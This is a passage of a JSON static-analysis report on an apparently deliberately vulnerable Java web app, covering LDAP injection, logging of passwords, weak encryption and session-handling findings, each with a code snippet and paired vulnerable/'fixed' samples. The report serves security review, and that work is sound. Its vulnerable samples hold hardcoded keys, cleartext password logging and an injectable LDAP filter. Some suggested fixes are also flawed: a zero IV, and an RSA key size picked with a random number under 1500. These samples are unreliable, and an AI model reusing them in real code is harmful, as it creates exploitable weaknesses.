code. But replacing an existing key with a randomized new one in a legacy code means re-encrypting the data at rest with the new key(s). It also means saving the new generated keys in a safe and secure place (e.g.: new DB column, encrypted or with restrictions to access and read the data on that column)\n\nOn the DB, when creating an encrypted column, there will be minimal performance impact on READ operations, but will have a performance impact on the WRITE and UPDATE for data encrypted on that column. The data size on disk will also increase for encrypted data when compared to clear data. There is no impact on indexing, but there is no way to sort, or filter by the encrypted column.", "abstract": "Use of RNGCryptoServiceProvider"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\n\t\t\t// generate secret key using AES algorithm\n\t\t\t<em class=\"red\">String encrypted = encryptWithHardcodedKey(userProfile.getPwd());</em>\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\n......\n}\t\nprivate String encryptWithHardcodedKey(String password) {\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\t<em class=\"red\">final String encryptionKey = &quot;MyPasswordEncryption&quot;;</em>\n\t\t \n\t\t\tbyte[] bytekey = encryptionKey.getBytes();\n\t\t\t<em class=\"red\">SecretKeySpec secretKey = new SecretKeySpec(bytekey, &quot;AES&quot;);</em>\n\t\t\tCipher cipher = Cipher.getInstance(&quot;AES/ECB/PKCS5Padding&quot;);\n            cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n            encrypted= Base64.getEncoder().encodeToString(cipher.doFinal(password.getBytes(&quot;UTF-8&quot;)));\n                        \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t}", "nonvulncode": "public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tif(userProfile.getUserName()!=null) {\n\t\t\t// generate secret key using AES algorithm\n\t\t\t<em class=\"blue\">String encrypted = encryptWithAES(userProfile.getPwd());</em>\n\t        userProfile.setEncryptionKey(encrypted);\n\t        userProfile = dao.addUserProfile(userProfile);\n......\n}\t\nprivate String encryptWithAES(String password) {\n\t\t\n\t\tString encrypted=null;\n\t\ttry {\n\t\t\t<em class=\"blue\">key = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\n\t\t \n            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            \n            ecipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(new byte[16]));        \n            byte[] enc = ecipher.doFinal(password.getBytes());       \n            encrypted = Base64.getEncoder().encodeToString(enc);\n            \n            ecipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(new byte[16]));            \n            byte[] decrptByte=ecipher.doFinal(Base64.getDecoder().decode(encrypted));            \n            String decrypted = new String(decrptByte); \n                        \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} catch (InvalidAlgorithmParameterException e) {\n\t\t\tlogger.error(&quot;Error during AES encryption&quot;, e.getMessage());\n\t\t} \n\t\t\n\t\treturn encrypted;\n\t}\t</em>", "comments": "Having hardcoded encryption key, would lead to attacker decrypt the password if he has access to application and file. It is recommended to use keyGenerator which generated symmetric encryption key.", "impact": "In case of a privilege account management system is part of the architecture, the encryption key may be inserter during production deployment time by an automated system (e.g. cyberark). In this case, discuss with the security team to validate the approach.\n\nIn case of user PII information, it is recommended to have a distributed architecture, where the system has the keys stored in a different database. (e.g., the system can load the decryption keys from the authentication server, or if it does not exist, generate one personal key for the user and save as part of the user properties on the authentication server.)", "abstract": "Use of KeyGenerator"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "LDAP Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00465", "function": "javax.naming.directory.DirContext.search()", "line": "1113", "snippet": "String filter = \"(&(uid=\" + user + \"))\";\n\t\t\t\tString base = \"\";\n\t\t\t\tNamingEnumeration<SearchResult> results = ctx.search(base, filter, new SearchControls()); // Noncompliant\n\t\t\t\t//filter encode checked in searchArgs->Filter\n\t\t\t\t//NamingEnumeration enumList=ctx.list(\"ou=People\");"}]}], "remediation": null}, "Privacy Violation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00474", "function": "org.slf4j.Logger.debug()", "line": "167", "snippet": "String password = request.getParameter(\"pwd\");\n\t\t//logger.debug(\"Inside login validation debug\"+Encode.forHtmlAttribute(uname)+\"without encoding\"+uname+Encode.forHtmlAttribute(password));\n\t\tlogger.debug(\"Inside login validation debug \"+ uname +\" without encoding\" + uname + password);\n\t\t\n\t\tModelAndView mv= new ModelAndView();"}]}], "remediation": {"remediation": {"@id": "R.0061", "@name": "Privacy Violation", "@dateLastModified": "11/19/2020", "faqs": {"faq": {"question": "<em class=\"bold\"> </em>But the attacker cannot access the log files! This cannot be a security problem\u2026", "answer": "<em class=\"bold\"> </em>Confidential information must NOT be included in log files as there are minimal data loss prevention controls on those files."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Login([Bind(Include = &quot;Username,Password&quot;)]AccountVM account)\n        {\n            if (ModelState.IsValid) { \n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n                \n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, account.Username));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n                                Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n                                Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n\n                                HttpCookie userRole = new HttpCookie(&quot;userRole&quot;, account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n                                userRole.HttpOnly = true;\n                                userRole.Secure = true;\n                                Response.Cookies.Add(userRole);\n\n                                FormsAuthentication.SetAuthCookie(account.Username, false);\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(account.Username, false);\n                                else\n                                    return View(&quot;Main&quot;);\n\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            logger.Info(&quot;Invalid Credentials for username=&quot; + account.Username + &quot; with password=&quot; + <em class=\"red\">account.Password</em>);\n            return View();\n        }", "nonvulncode": "public ActionResult Login([Bind(Include = &quot;Username,Password&quot;)]AccountVM account)\n        {\n            if (ModelState.IsValid) { \n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n                \n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, account.Username));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                Session[&quot;role&quot;] = account.GetRoleDef(dr[&quot;RoleId&quot;].ToString());\n                                Session[&quot;FirstName&quot;] = dr[&quot;FirstName&quot;];\n                                Session[&quot;LastName&quot;] = dr[&quot;LastName&quot;];\n\n                                HttpCookie userRole = new HttpCookie(&quot;userRole&quot;, account.GetRoleDef(dr[&quot;RoleId&quot;].ToString()));\n                                userRole.HttpOnly = true;\n                                userRole.Secure = true;\n                                Response.Cookies.Add(userRole);\n\n                                FormsAuthentication.SetAuthCookie(account.Username, false);\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(account.Username, false);\n                                else\n                                    return View(&quot;Main&quot;);\n\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            <em class=\"blue\">logger.Info(&quot;Invalid Credentials for username=&quot; + account.Username);</em>\n            return View();\n        }", "comments": "Sensitive information must not be logged (e.g. PII including  user password, SSN, name, etc.). In the example the password is considered a private information of the user should not be logged. Logging this information can compromise the user account, and non-repudiation can not be used against a malicious user (in court, forensics will prove the user and password were logged in clear text and anyone could be logged as the user to the system. This breaks the non-repudiation argument that says only the user had access to the user account).", "impact": "No impact for the code performance.\n\nOld logs that contain PII information must be properly secure. Depending to the access level, the application team must open an incident to the SOC to respond and investigate if data was leaked internally.", "abstract": "Use of generic message"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\nString password = request.getParameter(&quot;pwd&quot;);\n\t\t<em class=\"red\">logger.debug(&quot;Entering Employee secure application with username and passowrd&quot;+uname+password);</em>\n....\n}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n<em class=\"blue\">char[] chars = (request.getParameter(&quot;pwd&quot;).toCharArray());</em>\n\t\t<em class=\"blue\">logger.debug(&quot;Entering Employee secure application with username&quot;+uname);\n....</em>\n}", "comments": "Sensitive information must not be logged.In the vulnerable sample, password is logged which will place the application to potential security risk. Also it is advised to use character array instead of String for sensitive information, since logging it will not be plain text data.", "impact": "No impact for the code performance.", "abstract": "Use of generic message without sensitive information"}]}, "mitigations": null}}}, "Weak Encryption: Insufficient Key Size": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00483", "function": "Function: encryptWithRSA()", "line": "514", "snippet": "* @return\n\t */\n\tprivate String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;"}]}], "remediation": null}, "Weak Encryption: Missing Required Step": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00484", "function": "getInstance(\"AES\").generateKey() : KeyGenerator initialization skipped()", "line": "393", "snippet": "SecretKeySpec key1 = null;\n\t\ttry {\n\t\t\tkey = KeyGenerator.getInstance(\"AES\").generateKey();\n\t\t \n            ecipher = Cipher.getInstance(\"AES\");"}]}], "remediation": {"remediation": {"@id": "R.0217", "@name": "Weak Encryption: Missing Required Step", "@dateLastModified": "11/19/2020", "faqs": null, "recommendations": {"recommendation": {"@type": "JAVA/JSP", "vulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;, &quot;BC&quot;);<em class=\"red\">\n\t\t\tkeyPairGenerator.initialize(1500);\n</em>\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\n\t\t\tCipher cipher = Cipher.getInstance(&quot;RSA/NONE/OAEPWithSHA1AndMGF1Padding&quot;);\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes());\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, privateKey);\n\t\t\tbyte[] decodedByte = Base64.getDecoder().decode(encryptedText);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} \n        \t\n\t\treturn encryptedText;\n\t}\n\n\tpublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\t\t\t\t\t\t\t\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\t\t\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \t   \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;\n\t}", "nonvulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;, &quot;BC&quot;);\n\t\t\t<em class=\"blue\">SecureRandom secRandom = new SecureRandom();\n\t\t\tkeyPairGenerator.initialize(secRandom.nextInt(1500));</em>\n\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\n\t\t\tCipher cipher = Cipher.getInstance(&quot;RSA/NONE/OAEPWithSHA1AndMGF1Padding&quot;);\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes());\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class\n\n\t\t\tcipher.init(Cipher.DECRYPT_MODE, privateKey);\n\t\t\tbyte[] decodedByte = Base64.getDecoder().decode(encryptedText);\n\t\t\tdecodedByte = cipher.doFinal(decodedByte);\n\t\t\tString decryptedTxt = new String(decodedByte);\n\n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;Error during property file download - RSA encryption&quot;,e.getMessage());\n\t\t} \n        \t\n\t\treturn encryptedText;\n\t}\n\n\tpublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\t\t\t\t\t\t\t\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\t\t\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \t   \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t        e.printStackTrace();\n\t    }\n\t\treturn mv;\n\t}", "comments": "When doing encryption in the code, make sure all the setps required to enforce randomness and increase the dificulty to bruteforce the algorithm, are in place.\nIn this case, there is a missing required step during encyption/decryption that will lead to weak key generation (In the example shown, keypairGenerator was initialized without secure random).\nUsing secure random during key pair generator makes the private/public key more complex, so the keys are more secure and the attacker will not be able to guess or brute force the key pair.", "impact": "No impact", "abstract": "Use of secureRandom for key generation"}}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Trust Boundary Violation": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00078", "function": "Return departmentMap()", "line": "162", "snippet": "}\n\t      \n\t      return departmentMap;\n\t   }"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00044", "function": "javax.servlet.ServletRequest.setAttribute()", "line": "56", "snippet": "}\n            \n            request.setAttribute(\"bmi\", bmi);\n            response.setHeader(\"Test\", \"Success\");\n            response.setHeader(\"BMI\", String.valueOf(bmi));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00045", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "186", "snippet": "{\t\t\t\n\t\tHttpSession session = request.getSession();\n\t    session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00046", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "205", "snippet": "{\n\t\t\tmv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00047", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "210", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00048", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "806", "snippet": "r.close();\n\t\t\t\tmv.setViewName(\"commandExec\");\n\t\t\t\tmv.addObject(\"dirlist\", dirList);\n\t\t\t} catch (IOException e) {\n\t\t\t\tlogger.error(\"Error in executing command\", e);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00049", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "226", "snippet": "return new ModelAndView(\"success\", \"loginBean\", bean);\n\t\t} else {\n\t\t\tmv.setViewName(\"login\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00050", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "1177", "snippet": "System.out.println(response.toString());\n\t\tmv.setViewName(\"displayDetails\");\n        mv.addObject(\"msg\", response.toString());\n\t\thttpClient.close();\n\t\t} catch (Exception e) {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00051", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "206", "snippet": "mv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00052", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "328", "snippet": "user.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(\"addUserProfile\",\"userProfile\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00053", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "207", "snippet": "mv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers\n\t\t\t\n\t\t\tHttpSession session = request.getSession();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00054", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "173", "snippet": "employeeSearchBean.setEmployeeList(employeeList);\n\t\t\n \t\treturn new ModelAndView(\"searchListEmployee\",\"employeeSearchBean\",employeeSearchBean);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00055", "function": "javax.servlet.ServletRequest.setAttribute()", "line": "56", "snippet": "}\n            \n            request.setAttribute(\"bmi\", bmi);\n            response.setHeader(\"Test\", \"Success\");\n            response.setHeader(\"BMI\", String.valueOf(bmi));"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00056", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "210", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00057", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "205", "snippet": "{\n\t\t\tmv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00058", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "212", "snippet": "session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));\n\n\t\t\tCookie userRole = new Cookie(\"userRole\", bean.getRoleID());"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00059", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "1025", "snippet": "Map<Integer, String> departmentMap = emp.getDepartmentMap();\n\t    \n\t    mv.addObject(\"msg\",departmentMap.toString());\n\t\tmv.setViewName(\"displayDetails\");\n\t\t} catch(Exception e) {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00060", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "206", "snippet": "mv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00061", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "155", "snippet": "System.out.println(\"String Date\"+strDate);\n\t\t\n\t\treturn new ModelAndView(\"listUser\",\"listUsersBean\",userAccounts);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00062", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "211", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00063", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "192", "snippet": "logger.info(\"CRLF injection veracode CWE 93\"+value); //CRLF Injection -> Improper Output Neutralization for Logs\n\t    logger.info(\"CRLF injection veracode CWE 93\"+request.getParameter(\"color\"));\n\t\treturn new ModelAndView(\"success\",\"color\",value);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00064", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "205", "snippet": "{\n\t\t\tmv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00065", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "211", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00066", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "1177", "snippet": "System.out.println(response.toString());\n\t\tmv.setViewName(\"displayDetails\");\n        mv.addObject(\"msg\", response.toString());\n\t\thttpClient.close();\n\t\t} catch (Exception e) {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00067", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "207", "snippet": "mv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers\n\t\t\t\n\t\t\tHttpSession session = request.getSession();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00068", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "173", "snippet": 